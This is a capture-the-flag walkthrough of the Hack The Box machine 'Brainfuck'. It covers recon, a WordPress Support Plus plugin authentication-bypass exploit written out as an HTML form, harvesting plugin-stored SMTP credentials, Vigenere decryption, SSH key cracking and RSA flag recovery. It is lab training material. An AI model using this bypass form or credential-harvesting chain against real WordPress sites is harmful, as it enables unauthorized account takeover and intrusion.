# recon
pymap
```
PORT    STATE SERVICE VERSION
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: UIDL RESP-CODES AUTH-RESP-CODE SASL(PLAIN) PIPELINING TOP USER CAPA


PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)


PORT    STATE SERVICE VERSION
143/tcp open  imap    Dovecot imapd


PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1


PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
Service Info: Host:  brainfuck
```
# 443 
let start with web app. From the nmap result `Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb` so let's add both hostname in our `/etc/hosts`
- sup3rs3cr3t.brainfuck.htb: Super Secret Forum
- https://brainfuck.htb/: wordpress.
- orestis@brainfuck.htb
let use `wpscan` to enumerate the site.
```console
$ wpscan --url https://brainfuck.htb/ --disable-tls-checks
.
.
.
[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
 | Found By: Rss Generator (Passive Detection)
 |  - https://brainfuck.htb/?feed=rss2, <generator>https://wordpress.org/?v=4.7.3</generator>
 |  - https://brainfuck.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.7.3</generator>

[i] Plugin(s) Identified:

[+] wp-support-plus-responsive-ticket-system
 | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
 | Last Updated: 2019-09-03T07:57:00.000Z
 | [!] The version is out of date, the latest version is 9.1.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 7.1.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
```
From my experiences that wp plug-in is vulnerable. So after googling a bit I found an exploit that would work perfectly with this version. [link](https://www.exploit-db.com/exploits/41006) the problem is we do not have any username yet. let run `wpscan` again but this time for user enum
```console
$ wpscan --url https://brainfuck.htb/ --disable-tls-checks -e u
[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] administrator
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```
okay now we got username, let check the exploit
```html
<form method="post" action="http://wp/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="administrator">
	<input type="hidden" name="email" value="sth">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>
```

# user

from the exploit page `You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().` we will need to check `action` to point at our target.  and then just login as `admin`
```html
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="admin">
	<input type="hidden" name="email" value="sth">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>
```
now put it in a .html file. and run python3 webserver
```
-kali@kali:~/HTB/brainfuck$ nano exploit.html
[10.10.14.43]-kali@kali:~/HTB/brainfuck$ zsh
┌──(kali㉿kali)-[~/HTB/brainfuck]
└─$ python3 -m http.server --cgi 8888                                       
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```
visit your localhost and press submit on the exploit page, now you will get a response back from the server with `admin` cookie... cool right? If you want to see it in action then use burp suit to intercept the traffic


now visit brainfuck.htb again. you should notice that we can now visit wordpress dashboard. My plan was to modify a web page using edit future but we do not have permission to edit anything. I then check the `plug-in` again and found out that there is another plug-in call `Easy WP SMTP`. I check the setting and found out SMTP password is save in the plug-in. To see the hidden password, check src code
```html
<input type="password" name="swpsmtp_smtp_password" value="kHGuERB29DNiNE">
```
- orestis@brainfuck.htb:orestis:kHGuERB29DNiNE
it is obvious that the next step is check emails on SMTP. connect to email server using ur favorite mail client with the cred!. you will find an email sent from root.brainfuck.htb.
```
Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO

Regards
```
Yeah! we got cred to the forum!! now visit `sup3rs3cr3t.brainfuck.htb` and login using `orestis:kIEnnfEKJ#9UmdO`.
Seem like *orestis* is asking for ssh key which is why admin create a encrypted thread where he post a like to the key. `mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr` this have to be the IP addr where we can get Orestis's ssh key!. 


the plan is running know plain text attack since we know that `Pieagnm - Jkoijeg nbw zwx mle grwsnn` = `Orestis - Hacking for fun and profit`. What we need is a key which they use to encrypt the message. Base on my CTF knowledge, I think it is a **Vigenere cipher**. how? `Orestis` = `Pieagnm` and both `s` in cipher text is `a` and `m` which mean it used a key. Also `Orestis - Hacking for fun and profit` is not always equal to `Pieagnm - Jkoijeg nbw zwx mle grwsnn`.
```
Orestis Hacking for fun and profit
Qbqquzs - Pnhekxs dpi fca fhf zdmgzt
Pieagnm - Jkoijeg nbw zwx mle grwsnn
Wejmvse - Fbtkqal zqb rso rnl cwihsf
```
let google for some for **Vigenere cipher known plain text attack**, I found this [tool](https://f00l.de/hacking/vigenere.php) which allow me to put in plaintext + cipher text and give me a key. which is `brainfuckmybrainfuckmybrainfu`. So the key should be either `brainfuckmy`, ` fuckmybrain`, or `mybrainfuck`. We will use the same site to decrypt the url to ssh key.


The real key is `fuckmybrain` which give us. `https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa` let go and grab the key!! 
```console
──(kali㉿kali)-[~/HTB/brainfuck]
└─$ cat id_rsa                        
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382
```
not a surprise, the key is encrypted!! let ssh2john and use Colabcat to decrypt it!
```console
$ /usr/share/john/ssh2john.py id_rsa > orestis.hash
```
the password is `3poulakia!` I google translate it and it mean 3 little bird. what a cute password. now ssh to the server using id_rsa + password
```console
──(kali㉿kali)-[~/HTB/brainfuck]
└─$ ssh orestis@brainfuck.htb -i id_rsa 
load pubkey "id_rsa": invalid format
The authenticity of host 'brainfuck.htb (10.10.10.17)' can't be established.
ECDSA key fingerprint is SHA256:S+b+YyJ/+y9IOr9GVEuonPnvVx4z7xUveQhJknzvBjg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'brainfuck.htb,10.10.10.17' (ECDSA) to the list of known hosts.
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
orestis@brainfuck.htb: Permission denied (publickey).
                                                                                                       
┌──(kali㉿kali)-[~/HTB/brainfuck]
└─$ chmod 600 id_rsa                                                                             255 ⨯
                                                                                                       
┌──(kali㉿kali)-[~/HTB/brainfuck]
└─$ ssh orestis@brainfuck.htb -i id_rsa
load pubkey "id_rsa": invalid format
Enter passphrase for key 'id_rsa': 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


You have mail.
Last login: Wed May  3 19:46:00 2017 from 10.10.11.4
orestis@brainfuck:~$ 
```
# root
```python
orestis@brainfuck:~$ cat encrypt.sage 
nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)



c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
```
by looking at the code, I know this is RSA. Thank god that I have been doing some CTF challenge and had crack some of them. so we have **p, q. and e which is save in debug.txt** also the cipher text which is encrypted root.txt which is save in output.txt. I will use one of my script that I used when I do CTF. link [here](../../../writeUp/CTF/ractf/rsa2.py). modify it and just run then you will get the root flag

- output.txt = ct
- debug.txt 1st line = p
- debug.txt 2nd line = q
- debug.txt 3rd line = e

and run!!